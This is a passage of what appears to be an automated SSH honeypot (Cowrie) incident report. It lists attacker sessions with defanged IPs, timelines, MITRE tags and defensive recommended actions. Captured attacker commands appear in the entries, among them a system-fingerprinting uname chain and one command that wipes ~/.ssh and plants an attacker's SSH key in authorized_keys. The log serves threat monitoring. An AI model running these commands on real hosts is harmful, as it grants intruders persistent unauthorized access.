| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:12:30` | `cowrie.session.connect` |
| `2026-07-31 20:12:31` | `cowrie.client.version` |
| `2026-07-31 20:12:31` | `cowrie.client.kex` |
| `2026-07-31 20:12:33` | `cowrie.login.success` |
| `2026-07-31 20:12:35` | `cowrie.session.params` |
| `2026-07-31 20:12:35` | `cowrie.command.input` |
| `2026-07-31 20:12:35` | `cowrie.command.input` |
| `2026-07-31 20:12:35` | `cowrie.command.input` |
| `2026-07-31 20:12:35` | `cowrie.command.input` |
| `2026-07-31 20:12:35` | `cowrie.command.input` |
| `2026-07-31 20:12:35` | `cowrie.command.success` |
| `2026-07-31 20:12:35` | `cowrie.command.input` |
| `2026-07-31 20:12:35` | `cowrie.command.input` |
| `2026-07-31 20:12:35` | `cowrie.command.input` |
| `2026-07-31 20:12:35` | `cowrie.command.input` |
| `2026-07-31 20:12:35` | `cowrie.log.closed` |
| `2026-07-31 20:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82a251f19e19

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 20:14 |
| **Last Seen** | 2026-07-31 20:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:14:30` | `cowrie.session.connect` |
| `2026-07-31 20:14:31` | `cowrie.client.version` |
| `2026-07-31 20:14:31` | `cowrie.client.kex` |
| `2026-07-31 20:14:33` | `cowrie.login.success` |
| `2026-07-31 20:14:34` | `cowrie.session.params` |
| `2026-07-31 20:14:34` | `cowrie.command.input` |
| `2026-07-31 20:14:34` | `cowrie.command.input` |
| `2026-07-31 20:14:34` | `cowrie.command.input` |
| `2026-07-31 20:14:34` | `cowrie.command.input` |
| `2026-07-31 20:14:34` | `cowrie.command.input` |
| `2026-07-31 20:14:34` | `cowrie.command.success` |
| `2026-07-31 20:14:34` | `cowrie.command.input` |
| `2026-07-31 20:14:34` | `cowrie.command.input` |
| `2026-07-31 20:14:34` | `cowrie.command.input` |
| `2026-07-31 20:14:34` | `cowrie.command.input` |
| `2026-07-31 20:14:35` | `cowrie.log.closed` |
| `2026-07-31 20:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fef2af323f1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 20:16 |
| **Last Seen** | 2026-07-31 20:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:16:30` | `cowrie.session.connect` |
| `2026-07-31 20:16:30` | `cowrie.client.version` |
| `2026-07-31 20:16:31` | `cowrie.client.kex` |
| `2026-07-31 20:16:33` | `cowrie.login.success` |
| `2026-07-31 20:16:35` | `cowrie.session.params` |
| `2026-07-31 20:16:35` | `cowrie.command.input` |
| `2026-07-31 20:16:35` | `cowrie.command.input` |
| `2026-07-31 20:16:35` | `cowrie.command.input` |
| `2026-07-31 20:16:35` | `cowrie.command.input` |
| `2026-07-31 20:16:35` | `cowrie.command.input` |
| `2026-07-31 20:16:35` | `cowrie.command.success` |
| `2026-07-31 20:16:35` | `cowrie.command.input` |
| `2026-07-31 20:16:35` | `cowrie.command.input` |
| `2026-07-31 20:16:35` | `cowrie.command.input` |
| `2026-07-31 20:16:35` | `cowrie.command.input` |
| `2026-07-31 20:16:35` | `cowrie.log.closed` |
| `2026-07-31 20:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-394688eaacbd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-31 20:16 |
| **Last Seen** | 2026-07-31 20:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:16:39` | `cowrie.session.connect` |
| `2026-07-31 20:16:39` | `cowrie.client.version` |
| `2026-07-31 20:16:39` | `cowrie.client.kex` |
| `2026-07-31 20:16:39` | `cowrie.login.success` |
| `2026-07-31 20:16:39` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:16:39` | `cowrie.direct-tcpip.data` |
| `2026-07-31 20:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27b1425f17f4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 20:18 |
| **Last Seen** | 2026-07-31 20:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:18:30` | `cowrie.session.connect` |
| `2026-07-31 20:18:30` | `cowrie.client.version` |
| `2026-07-31 20:18:30` | `cowrie.client.kex` |
| `2026-07-31 20:18:32` | `cowrie.login.success` |
| `2026-07-31 20:18:33` | `cowrie.session.params` |
| `2026-07-31 20:18:33` | `cowrie.command.input` |
| `2026-07-31 20:18:33` | `cowrie.command.input` |
| `2026-07-31 20:18:33` | `cowrie.command.input` |
| `2026-07-31 20:18:33` | `cowrie.command.input` |
| `2026-07-31 20:18:33` | `cowrie.command.input` |
| `2026-07-31 20:18:33` | `cowrie.command.success` |
| `2026-07-31 20:18:33` | `cowrie.command.input` |
| `2026-07-31 20:18:33` | `cowrie.command.input` |
| `2026-07-31 20:18:33` | `cowrie.command.input` |
| `2026-07-31 20:18:33` | `cowrie.command.input` |
| `2026-07-31 20:18:34` | `cowrie.log.closed` |
| `2026-07-31 20:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-063ed1b4c060

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 20:20 |
| **Last Seen** | 2026-07-31 20:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:20:25` | `cowrie.session.connect` |
| `2026-07-31 20:20:26` | `cowrie.client.version` |
| `2026-07-31 20:20:26` | `cowrie.client.kex` |
| `2026-07-31 20:20:27` | `cowrie.login.success` |
| `2026-07-31 20:20:29` | `cowrie.session.params` |
| `2026-07-31 20:20:29` | `cowrie.command.input` |
| `2026-07-31 20:20:29` | `cowrie.command.input` |
| `2026-07-31 20:20:29` | `cowrie.command.input` |
| `2026-07-31 20:20:29` | `cowrie.command.input` |
| `2026-07-31 20:20:29` | `cowrie.command.input` |
| `2026-07-31 20:20:29` | `cowrie.command.success` |
| `2026-07-31 20:20:29` | `cowrie.command.input` |
| `2026-07-31 20:20:29` | `cowrie.command.input` |
| `2026-07-31 20:20:29` | `cowrie.command.input` |
| `2026-07-31 20:20:29` | `cowrie.command.input` |
| `2026-07-31 20:20:29` | `cowrie.log.closed` |
| `2026-07-31 20:20:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23d87db9615b

| Field | Detail |
|---|---|
| **Source IP** | `36.64.33[.]82` |
| **First Seen** | 2026-07-31 20:20 |
| **Last Seen** | 2026-07-31 20:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:20:36` | `cowrie.session.connect` |
| `2026-07-31 20:20:36` | `cowrie.client.version` |
| `2026-07-31 20:20:36` | `cowrie.client.kex` |
| `2026-07-31 20:20:38` | `cowrie.login.success` |
| `2026-07-31 20:20:39` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.33[.]82` to AbuseIPDB if not already reported
- [ ] Block `36.64.33[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b10f2bd2afa

| Field | Detail |
|---|---|
| **Source IP** | `213.130.207[.]177` |
| **First Seen** | 2026-07-31 20:20 |
| **Last Seen** | 2026-07-31 20:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:20:44` | `cowrie.session.connect` |
| `2026-07-31 20:20:44` | `cowrie.client.version` |
| `2026-07-31 20:20:44` | `cowrie.client.kex` |
| `2026-07-31 20:20:46` | `cowrie.login.success` |
| `2026-07-31 20:20:46` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.130.207[.]177` to AbuseIPDB if not already reported
- [ ] Block `213.130.207[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11a4f7b2db0d

| Field | Detail |
|---|---|
| **Source IP** | `220.250.52[.]101` |
| **First Seen** | 2026-07-31 20:24 |
| **Last Seen** | 2026-07-31 20:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:24:33` | `cowrie.session.connect` |
| `2026-07-31 20:24:33` | `cowrie.client.version` |
| `2026-07-31 20:24:34` | `cowrie.client.kex` |
| `2026-07-31 20:24:35` | `cowrie.login.success` |
| `2026-07-31 20:24:36` | `cowrie.session.params` |
| `2026-07-31 20:24:36` | `cowrie.command.input` |
| `2026-07-31 20:24:36` | `cowrie.command.failed` |
| `2026-07-31 20:24:36` | `cowrie.log.closed` |
| `2026-07-31 20:24:37` | `cowrie.session.params` |
| `2026-07-31 20:24:37` | `cowrie.command.input` |
| `2026-07-31 20:24:37` | `cowrie.session.file_download` |
| `2026-07-31 20:24:37` | `cowrie.log.closed` |
| `2026-07-31 20:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.250.52[.]101` to AbuseIPDB if not already reported
- [ ] Block `220.250.52[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-205e4502a6f1

| Field | Detail |
|---|---|
| **Source IP** | `220.250.52[.]101` |
| **First Seen** | 2026-07-31 20:24 |
| **Last Seen** | 2026-07-31 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:24:38` | `cowrie.session.connect` |
| `2026-07-31 20:24:38` | `cowrie.client.version` |
| `2026-07-31 20:24:38` | `cowrie.client.kex` |
| `2026-07-31 20:24:39` | `cowrie.login.success` |
| `2026-07-31 20:24:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.250.52[.]101` to AbuseIPDB if not already reported
- [ ] Block `220.250.52[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ced02ba03d9f

| Field | Detail |
|---|---|
| **Source IP** | `220.250.52[.]101` |
| **First Seen** | 2026-07-31 20:24 |
| **Last Seen** | 2026-07-31 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:24:40` | `cowrie.session.connect` |
| `2026-07-31 20:24:40` | `cowrie.client.version` |
| `2026-07-31 20:24:40` | `cowrie.client.kex` |
| `2026-07-31 20:24:41` | `cowrie.login.success` |
| `2026-07-31 20:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.250.52[.]101` to AbuseIPDB if not already reported
- [ ] Block `220.250.52[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae9ba779d82c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-31 20:24 |
| **Last Seen** | 2026-07-31 20:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:24:45` | `cowrie.session.connect` |
| `2026-07-31 20:24:45` | `cowrie.client.version` |
| `2026-07-31 20:24:45` | `cowrie.client.kex` |
| `2026-07-31 20:24:45` | `cowrie.login.success` |
| `2026-07-31 20:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b53ce6b8f74d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-31 20:24 |
| **Last Seen** | 2026-07-31 20:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:24:45` | `cowrie.session.connect` |
| `2026-07-31 20:24:45` | `cowrie.client.version` |
| `2026-07-31 20:24:45` | `cowrie.client.kex` |
| `2026-07-31 20:24:45` | `cowrie.login.success` |
| `2026-07-31 20:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f3597aef53b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-31 20:24 |
| **Last Seen** | 2026-07-31 20:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:24:46` | `cowrie.session.connect` |
| `2026-07-31 20:24:46` | `cowrie.client.version` |
| `2026-07-31 20:24:46` | `cowrie.client.kex` |
| `2026-07-31 20:24:46` | `cowrie.login.success` |
| `2026-07-31 20:24:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8e52bc382ac

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-31 20:24 |
| **Last Seen** | 2026-07-31 20:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:24:46` | `cowrie.session.connect` |
| `2026-07-31 20:24:46` | `cowrie.client.version` |
| `2026-07-31 20:24:46` | `cowrie.client.kex` |
| `2026-07-31 20:24:46` | `cowrie.login.success` |
| `2026-07-31 20:24:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9b9382010a4

| Field | Detail |
|---|---|
| **Source IP** | `180.180.232[.]242` |
| **First Seen** | 2026-07-31 20:29 |
| **Last Seen** | 2026-07-31 20:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:29:35` | `cowrie.session.connect` |
| `2026-07-31 20:29:36` | `cowrie.client.version` |
| `2026-07-31 20:29:36` | `cowrie.client.kex` |
| `2026-07-31 20:29:38` | `cowrie.login.success` |
| `2026-07-31 20:29:39` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.180.232[.]242` to AbuseIPDB if not already reported
- [ ] Block `180.180.232[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-420ad8bc5650

| Field | Detail |
|---|---|
| **Source IP** | `117.2.123[.]19` |
| **First Seen** | 2026-07-31 20:29 |
| **Last Seen** | 2026-07-31 20:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:29:44` | `cowrie.session.connect` |
| `2026-07-31 20:29:45` | `cowrie.client.version` |
| `2026-07-31 20:29:45` | `cowrie.client.kex` |
| `2026-07-31 20:29:47` | `cowrie.login.success` |
| `2026-07-31 20:29:48` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:29:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.2.123[.]19` to AbuseIPDB if not already reported
- [ ] Block `117.2.123[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88e0279f6c69

| Field | Detail |
|---|---|
| **Source IP** | `203.110.233[.]225` |
| **First Seen** | 2026-07-31 20:32 |
| **Last Seen** | 2026-07-31 20:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:32:07` | `cowrie.session.connect` |
| `2026-07-31 20:32:08` | `cowrie.client.version` |
| `2026-07-31 20:32:08` | `cowrie.client.kex` |
| `2026-07-31 20:32:09` | `cowrie.login.success` |
| `2026-07-31 20:32:10` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:32:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.110.233[.]225` to AbuseIPDB if not already reported
- [ ] Block `203.110.233[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40c33517f856

| Field | Detail |
|---|---|
| **Source IP** | `80.233.12[.]109` |
| **First Seen** | 2026-07-31 20:32 |
| **Last Seen** | 2026-07-31 20:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:32:15` | `cowrie.session.connect` |
| `2026-07-31 20:32:15` | `cowrie.client.version` |
| `2026-07-31 20:32:15` | `cowrie.client.kex` |
| `2026-07-31 20:32:16` | `cowrie.login.success` |
| `2026-07-31 20:32:17` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.12[.]109` to AbuseIPDB if not already reported
- [ ] Block `80.233.12[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fc43e4a9597

| Field | Detail |
|---|---|
| **Source IP** | `60.191.58[.]203` |
| **First Seen** | 2026-07-31 20:33 |
| **Last Seen** | 2026-07-31 20:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 20:33:22` | `cowrie.session.connect` |
| `2026-07-31 20:33:22` | `cowrie.client.version` |
| `2026-07-31 20:33:22` | `cowrie.client.kex` |
| `2026-07-31 20:33:25` | `cowrie.login.success` |
| `2026-07-31 20:33:25` | `cowrie.direct-tcpip.request` |
| `2026-07-31 20:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.191.58[.]203` to AbuseIPDB if not already reported
- [ ] Block `60.191.58[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-236255cf85ec

| Field | Detail |
|---|---|
| **Source IP** | `187.126.105[.]42` |
| **First Seen** | 2026-07-31 20:33 |
| **Last Seen** | 2026-07-31 20:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
